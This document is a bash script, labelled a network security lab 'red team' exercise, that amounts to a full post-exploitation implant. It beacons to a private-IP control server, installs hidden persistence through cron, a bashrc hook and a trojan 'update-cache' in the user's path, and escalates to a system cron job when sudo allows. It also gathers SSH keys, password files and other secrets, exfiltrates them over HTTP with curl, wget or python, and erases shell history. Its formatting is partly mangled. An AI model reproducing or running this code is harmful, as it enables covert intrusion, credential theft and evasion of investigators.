  

#!/bin/bash 

====================================================== 

COMPUTER NETWORK SECURITY LAB CODE IN BASH 

NAME: YA GA ZIE PROTOCOL 

AUTHOR: CHARLES ASOLUKA 

====================================================== 

Create a hidden working directory 

export LC_ALL=C TEMPDIR=$(mktemp -d 2>/dev/null || echo "/tmp/.$(tr -dc 'a-z0-9' </dev/urandom | head -c 8)") mkdir -p $TEMPDIR cd $TEMPDIR || exit 1 

Constants 

TARGET_IP="192.168.74.136" TARGET_PORT="8080"  

Function to attempt HTTP exfiltration with retries 

attempt_http_exfil() { local content="$1" local max_attempts=3 local delay=5 local encoded_content=$(echo "$content" | base64 -w 0) 

for i in $(seq 1 $max_attempts); do 
    echo "[*] HTTP exfiltration attempt $i/$max_attempts..." 
    if command -v curl >/dev/null 2>&1; then 
        curl -s -m 10 -X POST -d "data=$encoded_content" "http://${TARGET_IP}:${TARGET_PORT}/collect" &>/dev/null && { 
            echo "[+] HTTP exfiltration successful!" 
            return 0 
        } || { 
            echo "[-] HTTP exfiltration failed, retrying in $delay seconds..." 
            sleep $delay 
        } 
    elif command -v wget >/dev/null 2>&1; then 
        wget -q -O /dev/null --post-data="data=$encoded_content" "http://${TARGET_IP}:${TARGET_PORT}/collect" &>/dev/null && { 
            echo "[+] HTTP exfiltration successful!" 
            return 0 
        } || { 
            echo "[-] HTTP exfiltration failed, retrying in $delay seconds..." 
            sleep $delay 
        } 
    else 
        # Fallback to Python if available 
        if command -v python3 >/dev/null 2>&1 || command -v python >/dev/null 2>&1; then 
            local py_cmd="python3" 
            command -v python3 >/dev/null 2>&1 || py_cmd="python" 
             
            $py_cmd -c " 
  

import urllib.request, urllib.parse try: params = urllib.parse.urlencode({'data': '$encoded_content'}) req = urllib.request.Request('http://${TARGET_IP}:${TARGET_PORT}/collect', data=params.encode()) urllib.request.urlopen(req, timeout=10) exit(0) except: exit(1) " && { echo "[+] HTTP exfiltration successful!" return 0 } || { echo "[-] HTTP exfiltration failed, retrying in $delay seconds..." sleep $delay } else echo "[-] No suitable HTTP client found (curl, wget, python)" return 1 fi fi done 

echo "[-] All HTTP exfiltration attempts failed" 
return 1 
  

} 

Modified function for HTTP-based C2 connection 

http_beacon() { local max_attempts=3 local delay=5 local hostname=$(hostname) local user=$(whoami) 

for i in $(seq 1 $max_attempts); do 
    echo "[*] C2 beacon attempt $i/$max_attempts..." 
    if command -v curl >/dev/null 2>&1; then 
        curl -s -m 10 "http://${TARGET_IP}:${TARGET_PORT}/beacon?host=${hostname}&user=${user}" &>/dev/null && { 
            echo "[+] C2 beacon successful!" 
            return 0 
        } || { 
            echo "[-] C2 beacon failed, retrying in $delay seconds..." 
            sleep $delay 
        } 
    elif command -v wget >/dev/null 2>&1; then 
        wget -q -O /dev/null "http://${TARGET_IP}:${TARGET_PORT}/beacon?host=${hostname}&user=${user}" &>/dev/null && { 
            echo "[+] C2 beacon successful!" 
            return 0 
        } || { 
            echo "[-] C2 beacon failed, retrying in $delay seconds..." 
            sleep $delay 
        } 
    else 
        echo "[-] No suitable HTTP client found" 
        return 1 
    fi 
done 
 
echo "[-] All C2 beacon attempts failed" 
return 1 
  

} 

===== PHASE 1: RECONNAISSANCE ===== 

echo "[+] Initiating reconnaissance..." RECON_DATA="${TEMPDIR}/recon_$(hostname).dat" { echo "===SYSTEM INFORMATION===" echo "Hostname: $(hostname)" echo "User Context: $(id)" echo "Kernel: $(uname -r)" echo "Date/Time: $(date)" echo "===NETWORK INFORMATION===" ip a | grep inet || ifconfig echo "===SUDO PRIVILEGES===" sudo -l 2>/dev/null || echo "No sudo privileges available" } > "${RECON_DATA}" 

===== PHASE 2: WEAPONIZATION ===== 

echo "[+] Preparing environment..." 

Create payload modules with HTTP beaconing instead of reverse shell 

mkdir -p ~/.config/modules 2>/dev/null cat > ~/.config/modules/.sysmonitor.sh << 'EOT' #!/bin/bash 

HTTP beaconing with retry logic 

TARGET_IP="192.168.126.146" TARGET_PORT="8080" HOSTNAME=$(hostname) USER=$(whoami) 

for i in {1..5}; do if command -v curl >/dev/null 2>&1; then curl -s -m 10 "http://${TARGET_IP}:${TARGET_PORT}/beacon?host=${HOSTNAME}&user=${USER}" &>/dev/null && exit 0 elif command -v wget >/dev/null 2>&1; then wget -q -O /dev/null "http://${TARGET_IP}:${TARGET_PORT}/beacon?host=${HOSTNAME}&user=${USER}" &>/dev/null && exit 0 fi 

if [ $? -eq 0 ]; then break fi sleep $((i*10)) done EOT chmod +x ~/.config/modules/.sysmonitor.sh 2>/dev/null 

===== PHASE 3: INSTALLATION ===== 

echo "[+] Installing persistence mechanisms..." 

Method 1: User cron job 

CRON_TMP="${TEMPDIR}/.cron_tmp" (crontab -l 2>/dev/null | grep -v "sysmonitor|192.168.126.146|9001|8080" || echo "") > "$CRON_TMP" echo "*/10 * * * * ~/.config/modules/.sysmonitor.sh >/dev/null 2>&1" >> "$CRON_TMP" crontab "$CRON_TMP" 2>/dev/null rm -f "$CRON_TMP" 2>/dev/null 

Method 2: Bashrc hook 

if ! grep -q "sysmonitor" ~/.bashrc 2>/dev/null; then echo '# System optimizer' >> ~/.bashrc echo '(sleep $((RANDOM % 60 + 30)) && ~/.config/modules/.sysmonitor.sh) &>/dev/null &' >> ~/.bashrc fi 

Method 3: Hidden executable in user path 

mkdir -p ~/.local/bin 2>/dev/null cat > ~/.local/bin/update-cache << 'EOT' #!/bin/bash 

Legitimate looking content first 

if [ "$1" == "--help" ]; then echo "Cache updater utility" exit 0 fi 

Actual payload 

(~/.config/modules/.sysmonitor.sh) & 

Run the original command if it exists 

if [ $# -gt 0 ]; then command update-cache.real "$@" fi EOT chmod +x ~/.local/bin/update-cache 2>/dev/null 

Add to PATH if not already 

if ! grep -q "PATH=/.local/bin" ~/.bashrc 2>/dev/null; then echo 'export PATH=/.local/bin:$PATH' >> ~/.bashrc fi 

===== PHASE 4: COMMAND & CONTROL ===== 

echo "[+] Establishing command and control channel..." 

Start HTTP beacon in background to avoid hanging if it fails 

(~/.config/modules/.sysmonitor.sh) &>/dev/null & 

Give the beacon a moment to establish 

sleep 3 

===== PHASE 5: LATERAL MOVEMENT ===== 

echo "[+] Gathering lateral movement data..." 

Find SSH keys and configs 

LATERAL_DATA="${TEMPDIR}/.lateral.dat" { echo "===SSH KEYS AND CONFIG===" find /home -name "id_rsa" -o -name "id_dsa" -o -name "config" -path "/.ssh/" 2>/dev/null | head -10 

echo -e "\n===NETWORK INFO===" ip neigh 2>/dev/null || arp -a 2>/dev/null 

echo -e "\n===OTHER USERS===" cat /etc/passwd | grep -v "nologin|false" 2>/dev/null } > "$LATERAL_DATA" 

===== PHASE 6: PRIVILEGE ESCALATION ===== 

echo "[+] Attempting privilege escalation..." PE_DATA="${TEMPDIR}/.privesc.dat" { echo "===PRIVILEGE ESCALATION VECTORS===" echo "Kernel: $(uname -r)" [ -f /etc/lsb-release ] && cat /etc/lsb-release 

echo -e "\n===SUID BINARIES===" find / -perm -4000 -type f 2>/dev/null | grep -v "snap|docker" | head -20 

echo -e "\n===SUDO RIGHTS===" sudo -l 2>/dev/null 

echo -e "\n===WRITEABLE SERVICES===" find /etc/systemd/system -type f -writable 2>/dev/null 

echo -e "\n===CRON JOBS===" find /etc/cron* -type f 2>/dev/null | head -10 } > "$PE_DATA" 

Attempt simple sudo check - run in background to prevent hanging 

if command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; then echo "[+] Sudo rights available, installing system-wide persistence" (sudo -n bash -c 'echo "#!/bin/bash 

HTTP beacon for system-wide persistence 

TARGET_IP="192.168.74.136" TARGET_PORT="8080" HOSTNAME=$(hostname) USER=$(whoami) 

for i in {1..3}; do if command -v curl >/dev/null 2>&1; then curl -s -m 10 "http://${TARGET_IP}:${TARGET_PORT}/beacon?host=${HOSTNAME}&user=${USER}" &>/dev/null elif command -v wget >/dev/null 2>&1; then wget -q -O /dev/null "http://${TARGET_IP}:${TARGET_PORT}/beacon?host=${HOSTNAME}&user=${USER}" &>/dev/null fi sleep 120 done " > /etc/cron.hourly/system-monitor && chmod +x /etc/cron.hourly/system-monitor') & fi 

===== PHASE 7: DATA EXFILTRATION ===== 

echo "[+] Collecting targeted data..." EXFIL_DATA="${TEMPDIR}/.exfil.dat" { echo "===SENSITIVE FILES===" find /home -type f -name ".kdbx" -o -name ".key" -o -name "*.pem" -o -name "id_rsa" -size -10k 2>/dev/null | head -5 

echo -e "\n===PASSWORD FRAGMENTS===" grep -r "password" --include=".txt" --include=".conf" /home 2>/dev/null | head -10 

echo -e "\n===RECON DATA===" cat "${RECON_DATA}" 2>/dev/null 

echo -e "\n===LATERAL MOVEMENT DATA===" cat "${LATERAL_DATA}" 2>/dev/null 

echo -e "\n===PRIVESC DATA===" cat "${PE_DATA}" 2>/dev/null } > "${EXFIL_DATA}" 

Exfiltrate data with HTTP retry mechanism 

if [ -f "${EXFIL_DATA}" ]; then echo "[+] Exfiltrating data..." EXFIL_CONTENT="===EXFIL DATA BEGIN=== $(cat "${EXFIL_DATA}") ===EXFIL DATA END===" 

attempt_http_exfil "$EXFIL_CONTENT" || echo "[-] Exfil failed after multiple attempts, continuing..." 

Write exfil data to a file for later retrieval 

echo "$EXFIL_CONTENT" > ~/.config/.cache_data fi 

===== PHASE 8: IMPACT DEMONSTRATION (SAFE) ===== 

echo "[+] Creating proof of concept..." touch ~/PROOF_OF_CONCEPT_ONLY echo "This system was accessed in a red team exercise on $(date)" > ~/PROOF_OF_CONCEPT_ONLY chmod 600 ~/PROOF_OF_CONCEPT_ONLY 

===== PHASE 9: ANTI-FORENSICS ===== 

echo "[+] Cleaning up..." export HISTSIZE=0 unset HISTFILE 

Remove temporary files but keep the modules for persistence 

find "$TEMPDIR" -type f 2>/dev/null | xargs rm -f 2>/dev/null [ -d "$TEMPDIR" ] && rm -rf "$TEMPDIR" 2>/dev/null 

Clear history 

[ -f ~/.bash_history ] && : > ~/.bash_history 2>/dev/null history -c 2>/dev/null 

Final stage - launch several concurrent connection attempts 

We do this to increase chances of successful connection 

echo "[+] Red team exercise completed successfully" echo "[+] Launching final connection attempts..." 

Run multiple connection attempts with increasing delays 

(sleep 5; ~/.config/modules/.sysmonitor.sh) &>/dev/null & (sleep 15; ~/.config/modules/.sysmonitor.sh) &>/dev/null & (sleep 30; ~/.config/modules/.sysmonitor.sh) &>/dev/null & 

Exit message 

echo "[+] Persistence installed. System will attempt connections every 10 minutes." echo "[+] Manual connection can be triggered with: ~/.config/modules/.sysmonitor.sh" 

 